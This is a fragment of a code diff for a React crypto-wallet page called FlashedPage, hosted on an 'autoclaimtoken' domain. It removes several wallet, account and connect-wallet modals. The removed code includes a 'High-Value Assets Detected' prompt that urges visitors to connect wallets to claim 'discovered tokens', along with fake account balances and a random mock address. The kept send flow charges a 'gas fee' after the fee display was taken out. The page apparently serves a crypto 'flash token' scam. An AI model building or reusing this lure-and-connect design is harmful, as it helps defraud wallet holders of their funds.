-                    Buy 0.1 ETH (~$300)
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
-
+          {/* Send Modal */}
           {showModal === 'send' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
@@ -815,12 +1057,6 @@ export default function FlashedPage() {
                       className="w-full bg-gray-700 border border-gray-600 rounded-lg px-3 py-2 text-white"
                     />
                   </div>
-                  <div className="bg-gray-700 p-3 rounded-lg">
-                    <div className="flex justify-between text-sm">
-                      <span className="text-gray-300">Gas fee:</span>
-                      <span className="text-white">{calculateGasFee()} ETH</span>
-                    </div>
-                  </div>
                   <button 
                     onClick={() => processTransaction('send', selectedToken, calculateGasFee())}
                     disabled={loading || !sendAddress || !sendAmount}
@@ -833,6 +1069,7 @@ export default function FlashedPage() {
             </div>
           )}
 
+          {/* Receive Modal */}
           {showModal === 'receive' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
@@ -860,14 +1097,12 @@ export default function FlashedPage() {
                       </button>
                     </div>
                   </div>
-                  <div className="text-gray-400 text-xs">
-                    Only send Ethereum (ETH) and ERC-20 tokens to this address
-                  </div>
                 </div>
               </div>
             </div>
           )}
 
+          {/* Swap Modal */}
           {showModal === 'swap' && (
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
@@ -911,276 +1146,10 @@ export default function FlashedPage() {
             </div>
           )}
 
-          {showModal === 'needFunds' && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
-                <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Insufficient Funds</h3>
-                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
-                </div>
-                <div className="space-y-4">
-                  <div className="text-gray-300 text-sm mb-4">
-                    You need ETH to make purchases. Get ETH from:
-                  </div>
-                  <a 
-                    href="https://www.coinbase.com/buy-ethereum"
-                    target="_blank"
-                    className="w-full bg-blue-600 hover:bg-blue-700 p-3 rounded-lg text-white font-semibold block text-center"
-                  >
-                    Buy ETH on Coinbase
-                  </a>
-                  <a 
-                    href="https://www.binance.com/en/buy-sell-crypto"
-                    target="_blank"
-                    className="w-full bg-yellow-600 hover:bg-yellow-700 p-3 rounded-lg text-white font-semibold block text-center"
-                  >
-                    Buy ETH on Binance
-                  </a>
-                  <button 
-                    onClick={() => {
-                      copyToClipboard(userAddress);
-                      setShowModal(null);
-                    }}
-                    className="w-full bg-gray-600 hover:bg-gray-700 p-3 rounded-lg text-white font-semibold"
-                  >
-                    Copy My Address (Receive ETH)
-                  </button>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {showModal === 'tokenDetails' && selectedToken && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
-                <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">{selectedToken.symbol}</h3>
-                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
-                </div>
-                <div className="space-y-4">
-                  <div className="text-center">
-                    <div className="text-3xl font-bold text-white mb-2">${Math.round(selectedToken.usdValue).toLocaleString()}</div>
-                    <div className="text-gray-300">{selectedToken.balance} {selectedToken.symbol}</div>
-                    <div className={`text-sm ${selectedToken.change.startsWith('+') ? 'text-green-400' : 'text-red-400'}`}>
-                      {selectedToken.change} (24h)
-                    </div>
-                  </div>
-                  
-                  <div className="bg-gray-700 p-3 rounded-lg">
-                    <div className="text-gray-300 text-sm mb-1">Contract Address:</div>
-                    <div className="text-white font-mono text-xs break-all">{selectedToken.contract}</div>
-                  </div>
-                  
-                  <div className="grid grid-cols-3 gap-2">
-                    <button 
-                      onClick={() => {
-                        setShowModal('send');
-                      }}
-                      className="bg-blue-600 hover:bg-blue-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
-                    >
-                      Send
-                    </button>
-                    <button 
-                      onClick={() => {
-                        setShowModal('swap');
-                      }}
-                      className="bg-purple-600 hover:bg-purple-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
-                    >
-                      Swap
-                    </button>
-                    <button 
-                      onClick={() => {
-                        copyToClipboard(selectedToken.contract);
-                        setStatus('Contract address copied!');
-                      }}
-                      className="bg-gray-600 hover:bg-gray-700 py-2 px-3 rounded-lg text-white font-semibold text-sm"
-                    >
-                      Copy
-                    </button>
-                  </div>
-                </div>
-              </div>
-            </div>
-          )}
-
-          {showModal === 'accountDetails' && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
-                <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Select Account</h3>
-                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
-                </div>
-                <div className="space-y-3">
-                  {accounts.map(account => (
-                    <div 
-                      key={account.id} 
-                      onClick={() => {
-                        if (account.id === 1) {
-                          setShowModal(null);
-                        } else {
-                          setStatus(`Account ${account.id} is empty. Only Account 1 has assets.`);
-                          setTimeout(() => setStatus(''), 3000);
-                        }
-                      }}
-                      className="flex items-center justify-between p-3 hover:bg-gray-700 rounded-lg cursor-pointer transition-all"
-                    >
-                      <div className="flex items-center">
-                        <img src={`https://api.dicebear.com/7.x/identicon/svg?seed=${account.address}`} alt={`Account ${account.id}`} className="w-8 h-8 rounded-full mr-3" />
-                        <div>
-                          <div className="text-white font-medium flex items-center">
-                            Account {account.id}
-                            {account.isActive && <div className="w-2 h-2 bg-green-400 rounded-full ml-2"></div>}
-                          </div>
-                          <div className="text-gray-400 text-sm">{account.address.slice(0,10)}...{account.address.slice(-4)}</div>
-                        </div>
-                      </div>
-                      <div className="text-right">
-                        <div className="text-white text-sm">${Math.round(account.balance).toLocaleString()}</div>
-                        <div className="text-gray-400 text-xs">{account.isActive ? 'Active' : 'Empty'}</div>
-                      </div>
-                    </div>
-                  ))}
-                </div>
-              </div>
-            </div>
-          )}
-
-          {showModal === 'walletOptions' && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
-                <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Connect Wallet</h3>
-                  <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
-                </div>
-                <div className="space-y-3">
-                  <button 
-                    onClick={() => {
-                      if (window.ethereum && window.ethereum.isMetaMask) {
-                        connectWallet();
-                      } else {
-                        window.open('https://metamask.app.link/dapp/autoclaimtoken.vercel.app/flashed', '_blank');
-                      }
-                    }}
-                    className="flex items-center w-full bg-orange-600 hover:bg-orange-700 p-4 rounded-lg text-white font-semibold"
-                  >
-                    <img 
-                      src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" 
-                      alt="MetaMask" 
-                      className="w-8 h-8 mr-3"
-                    />
-                    <div>
-                      <div>MetaMask</div>
-                      <div className="text-xs text-orange-200">Most popular wallet</div>
-                    </div>
-                  </button>
-                  <button 
-                    onClick={() => {
-                      if (window.ethereum && window.ethereum.isTrust) {
-                        connectWallet();
-                      } else {
-                        window.open('https://link.trustwallet.com/open_url?coin_id=60&url=https://autoclaimtoken.vercel.app/flashed', '_blank');
-                      }
-                    }}
-                    className="flex items-center w-full bg-blue-600 hover:bg-blue-700 p-4 rounded-lg text-white font-semibold"
-                  >
-                    <img 
-                      src="https://trustwallet.com/assets/images/media/assets/TWT.png" 
-                      alt="Trust Wallet" 
-                      className="w-8 h-8 mr-3 rounded-lg"
-                    />
-                    <div>
-                      <div>Trust Wallet</div>
-                      <div className="text-xs text-blue-200">Mobile-first wallet</div>
-                    </div>
-                  </button>
-                  <button 
-                    onClick={() => {
-                      if (window.ethereum && window.ethereum.isOKExWallet) {
-                        connectWallet();
-                      } else {
-                        window.open('https://www.okx.com/web3', '_blank');
-                      }
-                    }}
-                    className="flex items-center w-full bg-green-600 hover:bg-green-700 p-4 rounded-lg text-white font-semibold"
-                  >
-                    <div className="w-8 h-8 bg-green-500 rounded-full mr-3 flex items-center justify-center">
-                      <span className="text-white font-bold">O</span>
-                    </div>
-                    <div>
-                      <div>OKX Wallet</div>
-                      <div className="text-xs text-green-200">Exchange wallet</div>
-                    </div>
-                  </button>
-                  <button 
-                    onClick={() => {
-                      if (window.ethereum && window.ethereum.isCoinbaseWallet) {
-                        connectWallet();
-                      } else {
-                        window.open('https://www.coinbase.com/wallet', '_blank');
-                      }
-                    }}
-                    className="flex items-center w-full bg-indigo-600 hover:bg-indigo-700 p-4 rounded-lg text-white font-semibold"
-                  >
-                    <div className="w-8 h-8 bg-indigo-500 rounded-full mr-3 flex items-center justify-center">
-                      <span className="text-white font-bold">C</span>
-                    </div>
-                    <div>
-                      <div>Coinbase Wallet</div>
-                      <div className="text-xs text-indigo-200">Beginner friendly</div>
-                    </div>
-                  </button>
-                  <button 
-                    onClick={() => {
-                      const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
-                      setUserAddress(mockAddress);
-                      setShowModal(null);
-                      localStorage.setItem('connectedWallet', mockAddress);
-                    }}
-                    className="flex items-center w-full bg-gray-600 hover:bg-gray-700 p-4 rounded-lg text-white font-semibold"
-                  >
-                    <div className="w-8 h-8 bg-gray-500 rounded-full mr-3 flex items-center justify-center">
-                      <span className="text-white font-bold">+</span>
-                    </div>
-                    <div>
-                      <div>Other Wallet</div>
-                      <div className="text-xs text-gray-300">Manual connection</div>
-                    </div>
-                  </button>
-                </div>
-                <div className="mt-4 text-center">
-                  <p className="text-gray-400 text-sm">Choose your preferred wallet or download one above</p>
-                  <p className="text-gray-500 text-xs mt-1">All wallets work with this platform</p>
-                </div>
-              </div>
-            </div>
-          )}
-
           {/* Status Message */}
           {status && (
             <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-gray-800 px-4 py-2 rounded-lg border border-gray-600 z-50">
               <div className="text-center text-sm text-gray-300">{status}</div>
-            </div>
-          )}
-
-          {/* Connect Wallet Prompt */}
-          {!userAddress && !showModal && (
-            <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
-              <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4">
-                <h3 className="text-white font-bold text-lg mb-4">High-Value Assets Detected</h3>
-                <p className="text-gray-300 mb-6">Connect your wallet to access ${Math.round(walletData.totalValue).toLocaleString()} in discovered tokens</p>
-                <button 
-                  onClick={detectWalletAndRedirect}
-                  className="w-full bg-orange-600 hover:bg-orange-700 py-3 rounded-lg text-white font-semibold mb-3"
-                >
-                  Connect Wallet
-                </button>
-                <button 
-                  onClick={() => setShowModal('walletOptions')}
-                  className="w-full bg-gray-600 hover:bg-gray-700 py-2 rounded-lg text-white text-sm"
-                >
-                  More Wallet Options
-                </button>
-              </div>
             </div>
           )}
         </div>
